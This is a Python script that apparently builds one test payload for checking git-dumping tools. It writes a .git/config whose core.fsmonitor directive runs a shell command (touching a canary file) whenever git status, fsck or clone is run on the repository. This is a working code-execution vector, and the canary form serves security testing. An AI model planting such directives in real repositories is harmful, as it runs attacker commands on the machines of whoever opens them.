"""A1: malicious core.fsmonitor in .git/config.

When any pillager runs ``git fsck``, ``git status``, or ``git clone``
against the recovered ``.git/``, the fsmonitor directive fires and
writes ``/canary/PWNED_A1``.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402


def main() -> None:
    build_minimal_repo(
        HERE / 'payload',
        # ; false ensures git keeps walking files per the fsmonitor
        # protocol; otherwise the rest of the operation hangs.
        config=config_with('\tfsmonitor = "touch /canary/PWNED_A1; false"\n'),
    )
    print(f'Built A1 payload at {HERE / "payload"}')


if __name__ == '__main__':
    main()
